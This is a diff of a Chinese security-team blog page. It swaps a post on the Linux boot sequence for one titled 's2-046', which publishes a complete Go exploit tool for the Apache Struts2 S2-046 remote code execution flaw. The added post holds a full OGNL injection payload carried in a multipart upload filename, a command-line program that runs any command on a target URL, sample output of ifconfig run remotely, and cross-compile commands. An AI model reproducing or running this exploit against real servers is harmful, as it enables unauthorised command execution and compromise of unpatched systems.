@@ -68,7 +68,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Linux,启动顺序,init," />
+  <meta name="keywords" content="golang,struts2,exp,RCE," />
 
 
 
@@ -86,31 +86,16 @@
 
 
 
-<meta name="description" content="一、系统启动初始化init阶段1. Grub加载内核之后，第一个运行的程序是 /sbin/initinit是SysVinit的一个实体进程，是系统所有进程的顶级父进程，PID是1
-2.  /sbin/init 读取 /etc/inittab文件，确定运行级别etc/inittab文件的信息会包含以下信息给init程序
-
-捕获组合键的定义
-定义电源 fail/restore 脚本
-启动 getty">
+<meta name="description" content="Struts2 远程执行漏洞利用程序使用golang实现的一个小工具使用方法:123456789101112system@mac:~/golang/src/s2-046$ ./main http://xxx.com/1.jsp ifconfig200map[Server:[Apache-Coyote/1.1] Date:[Tue, 21 Mar 2017 06:08:39 GMT]]eth0">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Linux启动顺序">
-<meta property="og:url" content="http://www.0x001.com/2017/02/06/Linux启动顺序/index.html">
+<meta property="og:title" content="s2-046">
+<meta property="og:url" content="http://www.0x001.com/2017/03/21/s2-046-exp/index.html">
 <meta property="og:site_name" content="0x001 Team">
-<meta property="og:description" content="一、系统启动初始化init阶段1. Grub加载内核之后，第一个运行的程序是 /sbin/initinit是SysVinit的一个实体进程，是系统所有进程的顶级父进程，PID是1
-2.  /sbin/init 读取 /etc/inittab文件，确定运行级别etc/inittab文件的信息会包含以下信息给init程序
-
-捕获组合键的定义
-定义电源 fail/restore 脚本
-启动 getty">
-<meta property="og:updated_time" content="2017-02-11T11:08:32.000Z">
+<meta property="og:description" content="Struts2 远程执行漏洞利用程序使用golang实现的一个小工具使用方法:123456789101112system@mac:~/golang/src/s2-046$ ./main http://xxx.com/1.jsp ifconfig200map[Server:[Apache-Coyote/1.1] Date:[Tue, 21 Mar 2017 06:08:39 GMT]]eth0">
+<meta property="og:updated_time" content="2017-03-21T08:47:24.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Linux启动顺序">
-<meta name="twitter:description" content="一、系统启动初始化init阶段1. Grub加载内核之后，第一个运行的程序是 /sbin/initinit是SysVinit的一个实体进程，是系统所有进程的顶级父进程，PID是1
-2.  /sbin/init 读取 /etc/inittab文件，确定运行级别etc/inittab文件的信息会包含以下信息给init程序
-
-捕获组合键的定义
-定义电源 fail/restore 脚本
-启动 getty">
+<meta name="twitter:title" content="s2-046">
+<meta name="twitter:description" content="Struts2 远程执行漏洞利用程序使用golang实现的一个小工具使用方法:123456789101112system@mac:~/golang/src/s2-046$ ./main http://xxx.com/1.jsp ifconfig200map[Server:[Apache-Coyote/1.1] Date:[Tue, 21 Mar 2017 06:08:39 GMT]]eth0">
 
 
 
@@ -138,13 +123,13 @@
 
 
 
-  <link rel="canonical" href="http://www.0x001.com/2017/02/06/Linux启动顺序/"/>
+  <link rel="canonical" href="http://www.0x001.com/2017/03/21/s2-046-exp/"/>
 
 
 
 
 
-  <title> Linux启动顺序 | 0x001 Team </title>
+  <title> s2-046 | 0x001 Team </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -310,7 +295,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://www.0x001.com/2017/02/06/Linux启动顺序/">
+  <link itemprop="mainEntityOfPage" href="http://www.0x001.com/2017/03/21/s2-046-exp/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="1">
@@ -334,7 +319,7 @@
             
             
               
-                Linux启动顺序
+                s2-046
               
             
           </h1>
@@ -349,8 +334,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-06T10:05:32+08:00">
-                2017-02-06
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-03-21T16:41:58+08:00">
+                2017-03-21
               </time>
             
 
@@ -372,8 +357,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Linux/" itemprop="url" rel="index">
-                    <span itemprop="name">Linux</span>
+                  <a href="/categories/Exploit/" itemprop="url" rel="index">
+                    <span itemprop="name">Exploit</span>
                   </a>
                 </span>
 
@@ -390,8 +375,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2017/02/06/Linux启动顺序/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/02/06/Linux启动顺序/" itemprop="commentCount"></span>
+                <a href="/2017/03/21/s2-046-exp/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/03/21/s2-046-exp/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -417,58 +402,11 @@
       
 
       
-        <h1 id="一、系统启动初始化init阶段"><a href="#一、系统启动初始化init阶段" class="headerlink" title="一、系统启动初始化init阶段"></a>一、系统启动初始化init阶段</h1><h2 id="1-Grub加载内核之后，第一个运行的程序是-sbin-init"><a href="#1-Grub加载内核之后，第一个运行的程序是-sbin-init" class="headerlink" title="1. Grub加载内核之后，第一个运行的程序是 /sbin/init"></a>1. Grub加载内核之后，第一个运行的程序是 /sbin/init</h2><p>init是SysVinit的一个实体进程，是系统所有进程的顶级父进程，PID是1</p>
-<h2 id="2-sbin-init-读取-etc-inittab文件，确定运行级别"><a href="#2-sbin-init-读取-etc-inittab文件，确定运行级别" class="headerlink" title="2.  /sbin/init 读取 /etc/inittab文件，确定运行级别"></a>2.  /sbin/init 读取 /etc/inittab文件，确定运行级别</h2><p><strong>etc/inittab文件的信息会包含以下信息给init程序</strong></p>
-<ul>
-<li>捕获组合键的定义</li>
-<li>定义电源 fail/restore 脚本</li>
-<li>启动 getty 和虚拟控制台</li>
-<li>系统需要进入的 runlevel<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">[root@centos ~]# cat /etc/inittab</div><div class="line"># inittab is only used by upstart for the default runlevel.</div><div class="line">#</div><div class="line"># ADDING OTHER CONFIGURATION HERE WILL HAVE NO EFFECT ON YOUR SYSTEM.</div><div class="line">#</div><div class="line"># System initialization is started by /etc/init/rcS.conf</div><div class="line">#</div><div class="line"># Individual runlevels are started by /etc/init/rc.conf</div><div class="line">#</div><div class="line"># Ctrl-Alt-Delete is handled by /etc/init/control-alt-delete.conf</div><div class="line">#</div><div class="line"># Terminal gettys are handled by /etc/init/tty.conf and /etc/init/serial.conf,</div><div class="line"># with configuration in /etc/sysconfig/init.</div><div class="line">#</div><div class="line"># For information on how to write upstart event handlers, or how</div><div class="line"># upstart works, see init(5), init(8), and initctl(8).</div><div class="line">#</div><div class="line"># Default runlevel. The runlevels used are:</div><div class="line">#   0 - halt (Do NOT set initdefault to this)</div><div class="line">#   1 - Single user mode</div><div class="line">#   2 - Multiuser, without NFS (The same as 3, if you do not have networking)</div><div class="line">#   3 - Full multiuser mode</div><div class="line">#   4 - unused</div><div class="line">#   5 - X11</div><div class="line">#   6 - reboot (Do NOT set initdefault to this)</div><div class="line">#</div><div class="line">id:3:initdefault:</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>当前系统使用有网络支持的多用户模式，字符终端，没有图形界面</p>
-<p><strong>Linux的运行等级设定如下:</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">0：关机</div><div class="line">1：单用户模式</div><div class="line">2：无网络支持的多用户模式</div><div class="line">3：有网络支持的多用户模式</div><div class="line">4：保留，未使用</div><div class="line">5：有网络支持有X-Window支持的多用户模式</div><div class="line">6：重新引导系统，即重启</div></pre></td></tr></table></figure></p>
-<h2 id="3-sbin-init-执行-etc-rc-d-rc-sysinit脚本"><a href="#3-sbin-init-执行-etc-rc-d-rc-sysinit脚本" class="headerlink" title="3. /sbin/init 执行 /etc/rc.d/rc.sysinit脚本"></a>3. /sbin/init 执行 /etc/rc.d/rc.sysinit脚本</h2><p><strong>sysinit的是系统启动的初始化脚本, 会做以下一些工作：</strong></p>
-<ul>
-<li>激活 udev 和 selinux</li>
-<li>设置定义在/etc/sysctl.conf 中的内核参数</li>
-<li>设置系统时钟</li>
-<li>加载 keymaps</li>
-<li>使用交换分区</li>
-<li>设置主机名(hostname)</li>
-<li>根分区检查和 remount</li>
-<li>激活 RAID 和 LVM 设备</li>
-<li>开启磁盘配额</li>
-<li>检查并挂载所有文件系统</li>
-<li>清除过期的 locks 和 PID 文件</li>
-</ul>
-<h2 id="4-sbin-init-执行-etc-rc-d-rc脚本"><a href="#4-sbin-init-执行-etc-rc-d-rc脚本" class="headerlink" title="4. /sbin/init 执行 /etc/rc.d/rc脚本"></a>4. /sbin/init 执行 /etc/rc.d/rc脚本</h2><blockquote>
-<p>/etc/rc脚本确定 /etc/inittab文件配置的运行级别ID(X)。</p>
-</blockquote>
-<p>每个 runlevel X 都有一个这样的目录，目录名为/etc/rc.d/rcX.d。在这些目录下存放着很多不同的脚本。</p>
-<p>文件名以 S (start) 开头的脚本就是启动时应该运行的脚本，S 后面跟的数字定义了这些脚本的执行顺序。</p>
-<p>文件名以 K (kill) 开头的脚本表示启动的时候不执行的脚本。</p>
-<p>在/etc/rc.d/rcX.d 目录下的脚本其实都是一些软链接文件，真实的脚本文件存放在/etc/init.d 目录下, 这个目录的文件通常被称为Linux服务启动脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">[root@centos rc3.d]# pwd</div><div class="line">/etc/rc3.d</div><div class="line">[root@centos rc3.d]# ls -al</div><div class="line">总用量 8</div><div class="line">drwxr-xr-x.  2 root root 4096 11月 29 13:12 .</div><div class="line">drwxr-xr-x. 10 root root 4096 1月  27 09:34 ..</div><div class="line">lrwxrwxrwx.  1 root root   19 11月 29 12:49 K10saslauthd -&gt; ../init.d/saslauthd</div><div class="line">lrwxrwxrwx.  1 root root   17 11月 16 2015 K30postfix -&gt; ../init.d/postfix</div><div class="line">lrwxrwxrwx.  1 root root   20 11月 16 2015 K50netconsole -&gt; ../init.d/netconsole</div><div class="line">lrwxrwxrwx.  1 root root   21 11月 16 2015 K87restorecond -&gt; ../init.d/restorecond</div><div class="line">lrwxrwxrwx.  1 root root   15 11月 16 2015 K89rdisc -&gt; ../init.d/rdisc</div><div class="line">lrwxrwxrwx.  1 root root   19 11月 16 2015 K92ip6tables -&gt; ../init.d/ip6tables</div><div class="line">lrwxrwxrwx.  1 root root   18 11月 29 12:34 K92iptables -&gt; ../init.d/iptables</div><div class="line">lrwxrwxrwx.  1 root root   22 11月 16 2015 S02lvm2-monitor -&gt; ../init.d/lvm2-monitor</div><div class="line">lrwxrwxrwx.  1 root root   17 11月 16 2015 S10network -&gt; ../init.d/network</div><div class="line">lrwxrwxrwx.  1 root root   16 11月 16 2015 S11auditd -&gt; ../init.d/auditd</div><div class="line">lrwxrwxrwx.  1 root root   17 11月 16 2015 S12rsyslog -&gt; ../init.d/rsyslog</div><div class="line">lrwxrwxrwx.  1 root root   26 11月 16 2015 S25blk-availability -&gt; ../init.d/blk-availability</div><div class="line">lrwxrwxrwx.  1 root root   15 11月 16 2015 S25netfs -&gt; ../init.d/netfs</div><div class="line">lrwxrwxrwx.  1 root root   19 11月 16 2015 S26udev-post -&gt; ../init.d/udev-post</div><div class="line">lrwxrwxrwx.  1 root root   14 11月 26 08:19 S55sshd -&gt; ../init.d/sshd</div><div class="line">lrwxrwxrwx.  1 root root   15 11月 16 2015 S90crond -&gt; ../init.d/crond</div><div class="line">lrwxrwxrwx.  1 root root   15 11月 29 13:12 S95jexec -&gt; ../init.d/jexec</div><div class="line">lrwxrwxrwx.  1 root root   11 11月 16 2015 S99local -&gt; ../rc.local</div></pre></td></tr></table></figure></p>
-<blockquote>
-<p>chkconfig 名字就是对/etc/init.d/目录下的服务脚本进行管理的工具，实际上就是对 /etc/rcX.d/下的软链接文件的增删改。</p>
-</blockquote>
-<h2 id="5-sbin-init-执行-etc-rc-d-rc-local-脚本"><a href="#5-sbin-init-执行-etc-rc-d-rc-local-脚本" class="headerlink" title="5. /sbin/init 执行 /etc/rc.d/rc.local 脚本"></a>5. /sbin/init 执行 /etc/rc.d/rc.local 脚本</h2><p>rc.local 是 Linux 留给用户进行个性化设置的地方。比如放一些自定义的启动命令</p>
-<h2 id="6-启动登录终端-sbin-mingetty，等待登录"><a href="#6-启动登录终端-sbin-mingetty，等待登录" class="headerlink" title="6. 启动登录终端/sbin/mingetty，等待登录"></a>6. 启动登录终端/sbin/mingetty，等待登录</h2><p>mingetty 会启动 /bin/login进程，用来验证帐户密码，输入正确的账户密码之后,从/etc/passwd的账户配置里面启动响应的shell,例如下面root帐户使用了bash<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">[root@centos ~]# cat /etc/passwd</div><div class="line">root:x:0:0:root:/root:/bin/bash</div><div class="line">bin:x:1:1:bin:/bin:/sbin/nologin</div><div class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</div><div class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</div><div class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</div><div class="line">sync:x:5:0:sync:/sbin:/bin/sync</div><div class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</div><div class="line">halt:x:7:0:halt:/sbin:/sbin/halt</div><div class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</div></pre></td></tr></table></figure></p>
-<h1 id="二、用户登录阶段"><a href="#二、用户登录阶段" class="headerlink" title="二、用户登录阶段"></a>二、用户登录阶段</h1><h2 id="7-用户登录后先执行-etc-profile"><a href="#7-用户登录后先执行-etc-profile" class="headerlink" title="7. 用户登录后先执行 /etc/profile"></a>7. 用户登录后先执行 /etc/profile</h2><blockquote>
-<p>这个文件是所有用户登录系统后的设置环境信息,当用户第一次登录时,该文件被执行. 并从/etc/profile.d目录的配置文件中搜集shell的设置</p>
-</blockquote>
-<p>紧接着profile文件里面去启动 /etc/profile.d 下的所有文件</p>
-<h2 id="8-执行-bash-profile"><a href="#8-执行-bash-profile" class="headerlink" title="8. 执行 ~/.bash_profile"></a>8. 执行 ~/.bash_profile</h2><blockquote>
-<p>这个文件是用户专属的bash shell初始化脚本<br>当用户登录时,该文件仅仅执行一次!默认情况下,他设置一些环境变量<br>~/.bash_profile会判断 ~/.bashrc文件是否存在并执行，~/.bashrc会判断/etc/bashrc文件是否存在并执行，最后设置PATH环境变量，结束。<br>所以~/.bashrc和/etc/bashrc都是层层嵌套执行的。</p>
-</blockquote>
-<h2 id="9-执行-bashrc"><a href="#9-执行-bashrc" class="headerlink" title="9. 执行 ~/.bashrc"></a>9. 执行 ~/.bashrc</h2><blockquote>
-<p>这个文件是用户专属的bash shell初始化脚本</p>
-</blockquote>
-<p>当登录时以及每次打开新的shell时,该文件被执行<br>~/.bashrc 会判断 /etc/bashrc文件是否存在并执行</p>
-<h2 id="10-执行-etc-bashrc"><a href="#10-执行-etc-bashrc" class="headerlink" title="10. 执行 /etc/bashrc"></a>10. 执行 /etc/bashrc</h2><blockquote>
-<p>这个文件是bash环境的全局文件。几乎默认存在，每个登录的用户上去之后都要初始化一下bash的环境。</p>
-</blockquote>
-<p>当bash shell被打开时,该文件被执行（即每次新开一个终端，都会执行bashrc）</p>
+        <h1 id="Struts2-远程执行漏洞利用程序"><a href="#Struts2-远程执行漏洞利用程序" class="headerlink" title="Struts2 远程执行漏洞利用程序"></a>Struts2 远程执行漏洞利用程序</h1><p>使用golang实现的一个小工具<br>使用方法:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">system@mac:~/golang/src/s2-046$ ./main http://xxx.com/1.jsp ifconfig</div><div class="line">200</div><div class="line">map[Server:[Apache-Coyote/1.1] Date:[Tue, 21 Mar 2017 06:08:39 GMT]]</div><div class="line"></div><div class="line">eth0      Link encap:Ethernet  HWaddr 52:54:E4:D1:15:00</div><div class="line">          inet addr:192.168.1.8  Bcast:192.168.1.255  Mask:255.255.255.0</div><div class="line">          inet6 addr: fe80::5054:e4ff:fed1:1500/64 Scope:Link</div><div class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</div><div class="line">          RX packets:9999952 errors:0 dropped:0 overruns:0 frame:0</div><div class="line">          TX packets:6667457 errors:0 dropped:0 overruns:0 carrier:0</div><div class="line">          collisions:0 txqueuelen:1000</div><div class="line">          RX bytes:6575210434 (6.1 GiB)  TX bytes:939669875 (896.1 MiB)</div></pre></td></tr></table></figure></p>
+<p>源代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line">package main</div><div class="line"></div><div class="line">import (</div><div class="line">	&quot;bytes&quot;</div><div class="line">	&quot;flag&quot;</div><div class="line">	&quot;fmt&quot;</div><div class="line">	&quot;log&quot;</div><div class="line">	&quot;mime/multipart&quot;</div><div class="line">	&quot;net/http&quot;</div><div class="line">)</div><div class="line"></div><div class="line">/* 给body添加类似上传文件的mime/multipart内容 */</div><div class="line">func newMultipartRequest(url string, params map[string]string, cmd string) (*http.Request, error) &#123;</div><div class="line"></div><div class="line">	payload := &quot;%&#123;(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm)&quot; +</div><div class="line">		&quot;:((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensym&quot; +</div><div class="line">		&quot;phony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())&quot; +</div><div class="line">		&quot;.(#context.setMemberAccess(#dm)))).(#cmd=&apos;&quot; + cmd + &quot;&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().c&quot; +</div><div class="line">		&quot;ontains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).&quot; +</div><div class="line">		&quot;(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOut&quot; +</div><div class="line">		&quot;putStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;\x00b&quot;</div><div class="line"></div><div class="line">	body := &amp;bytes.Buffer&#123;&#125;</div><div class="line">	writer := multipart.NewWriter(body)</div><div class="line"></div><div class="line">	_, err := writer.CreateFormFile(&quot;foo&quot;, payload)</div><div class="line">	if err != nil &#123;</div><div class="line">		return nil, err</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	for key, val := range params &#123;</div><div class="line">		_ = writer.WriteField(key, val)</div><div class="line">	&#125;</div><div class="line">	writer.Close()</div><div class="line"></div><div class="line">	req, err := http.NewRequest(&quot;POST&quot;, url, body)</div><div class="line">	req.Header.Set(&quot;Content-Type&quot;, writer.FormDataContentType())</div><div class="line">	return req, err</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">func main() &#123;</div><div class="line">	flag.Parse()</div><div class="line">	url := flag.Arg(0)</div><div class="line">	cmd := flag.Arg(1)</div><div class="line"></div><div class="line">	extraParams := map[string]string&#123;</div><div class="line">		&quot;&quot;: &quot;&quot;,</div><div class="line">	&#125;</div><div class="line">	request, err := newMultipartRequest(url, extraParams, cmd)</div><div class="line">	if err != nil &#123;</div><div class="line">		log.Fatal(err)</div><div class="line">	&#125;</div><div class="line">	request.Header.Set(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&quot;)</div><div class="line"></div><div class="line">	client := &amp;http.Client&#123;&#125;</div><div class="line">	resp, err := client.Do(request)</div><div class="line">	if err != nil &#123;</div><div class="line">		log.Fatal(err)</div><div class="line">	&#125; else &#123;</div><div class="line">		/* 读取response返回数据 */</div><div class="line">		body := &amp;bytes.Buffer&#123;&#125;</div><div class="line">		_, err := body.ReadFrom(resp.Body)</div><div class="line">		if err != nil &#123;</div><div class="line">			log.Fatal(err)</div><div class="line">		&#125;</div><div class="line">		resp.Body.Close()</div><div class="line">		//fmt.Println(resp.StatusCode)</div><div class="line">		//fmt.Println(resp.Header)</div><div class="line">		fmt.Println(body)</div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>交叉编译Linux<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ GOOS=linux GOARCH=amd64 go build -ldflags &quot;-s -w&quot; main.go</div></pre></td></tr></table></figure></p>
+<p>交叉编译Windows<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ GOOS=windows GOARCH=amd64 go build -ldflags &quot;-s -w&quot; main.go</div></pre></td></tr></table></figure></p>
+<p>交叉编译Mac OSX<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ GOOS=darwin GOARCH=amd64 go build -ldflags &quot;-s -w&quot; main.go</div></pre></td></tr></table></figure></p>
 
       
     </div>
@@ -492,11 +430,13 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Linux/" rel="tag"># Linux</a>
+            <a href="/tags/golang/" rel="tag"># golang</a>
           
-            <a href="/tags/启动顺序/" rel="tag"># 启动顺序</a>
+            <a href="/tags/struts2/" rel="tag"># struts2</a>
           
-            <a href="/tags/init/" rel="tag"># init</a>
+            <a href="/tags/exp/" rel="tag"># exp</a>
+          
+            <a href="/tags/RCE/" rel="tag"># RCE</a>
           
         </div>
       
@@ -505,8 +445,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/02/01/python设置国内镜像/" rel="next" title="Python设置国内镜像">
-                <i class="fa fa-chevron-left"></i> Python设置国内镜像
+              <a href="/2017/03/21/s2-045-exp/" rel="next" title="s2-045-exp">
+                <i class="fa fa-chevron-left"></i> s2-045-exp
               </a>
             
           </div>
@@ -515,8 +455,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/02/08/Linux服务脚本/" rel="prev" title="Linux服务启动脚本">
-                Linux服务启动脚本 <i class="fa fa-chevron-right"></i>
+              <a href="/2017/03/21/golang编译/" rel="prev" title="golang编译">
+                golang编译 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -532,10 +472,10 @@
 
     <div class="post-spread">
       
-        <div class="ds-share flat" data-thread-key="2017/02/06/Linux启动顺序/"
-     data-title="Linux启动顺序"
+        <div class="ds-share flat" data-thread-key="2017/03/21/s2-046-exp/"
+     data-title="s2-046"
      data-content=""
-     data-url="http://www.0x001.com/2017/02/06/Linux启动顺序/">
+     data-url="http://www.0x001.com/2017/03/21/s2-046-exp/">
   <div class="ds-share-inline">
     <ul  class="ds-share-icons-16">
 
@@ -562,8 +502,8 @@
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2017/02/06/Linux启动顺序/"
-           data-title="Linux启动顺序" data-url="http://www.0x001.com/2017/02/06/Linux启动顺序/">
+      <div class="ds-thread" data-thread-key="2017/03/21/s2-046-exp/"
+           data-title="s2-046" data-url="http://www.0x001.com/2017/03/21/s2-046-exp/">
       </div>
     
   </div>
@@ -708,7 +648,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#一、系统启动初始化init阶段"><span class="nav-number">1.</span> <span class="nav-text">一、系统启动初始化init阶段</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-Grub加载内核之后，第一个运行的程序是-sbin-init"><span class="nav-number">1.1.</span> <span class="nav-text">1. Grub加载内核之后，第一个运行的程序是 /sbin/init</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-sbin-init-读取-etc-inittab文件，确定运行级别"><span class="nav-number">1.2.</span> <span class="nav-text">2.  /sbin/init 读取 /etc/inittab文件，确定运行级别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-sbin-init-执行-etc-rc-d-rc-sysinit脚本"><span class="nav-number">1.3.</span> <span class="nav-text">3. /sbin/init 执行 /etc/rc.d/rc.sysinit脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-sbin-init-执行-etc-rc-d-rc脚本"><span class="nav-number">1.4.</span> <span class="nav-text">4. /sbin/init 执行 /etc/rc.d/rc脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-sbin-init-执行-etc-rc-d-rc-local-脚本"><span class="nav-number">1.5.</span> <span class="nav-text">5. /sbin/init 执行 /etc/rc.d/rc.local 脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-启动登录终端-sbin-mingetty，等待登录"><span class="nav-number">1.6.</span> <span class="nav-text">6. 启动登录终端/sbin/mingetty，等待登录</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#二、用户登录阶段"><span class="nav-number">2.</span> <span class="nav-text">二、用户登录阶段</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#7-用户登录后先执行-etc-profile"><span class="nav-number">2.1.</span> <span class="nav-text">7. 用户登录后先执行 /etc/profile</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-执行-bash-profile"><span class="nav-number">2.2.</span> <span class="nav-text">8. 执行 ~/.bash_profile</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-执行-bashrc"><span class="nav-number">2.3.</span> <span class="nav-text">9. 执行 ~/.bashrc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-执行-etc-bashrc"><span class="nav-number">2.4.</span> <span class="nav-text">10. 执行 /etc/bashrc</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Struts2-远程执行漏洞利用程序"><span class="nav-number">1.</span> <span class="nav-text">Struts2 远程执行漏洞利用程序</span></a></li></ol></div>
             
 
           </div>
